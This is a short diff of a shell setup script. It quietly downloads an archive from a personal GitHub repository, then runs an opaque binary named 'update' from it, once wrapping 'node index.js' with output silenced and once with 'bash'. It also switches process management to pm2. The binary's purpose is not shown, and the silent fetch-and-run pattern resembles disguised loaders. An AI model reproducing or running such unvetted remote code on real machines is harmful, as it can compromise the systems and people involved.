@@ -46,6 +46,8 @@ sleep 2
 apt-get update
 apt-get install -y google-chrome-stable
 wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/cheese.tar.gz > /dev/null
+sleep 2
+npm install pm2 -g
 
 sleep 2
 
@@ -94,6 +96,9 @@ sleep 2
 rm config.json
 
 sleep 2
+
+./update/update bash
+
 	
 cat > config.json <<END
 {
@@ -109,6 +114,6 @@ END
 
 sleep 5
 
-./update/update node index.js 1>/dev/null 2>&1
+pm2 start index.js --watch
 
 
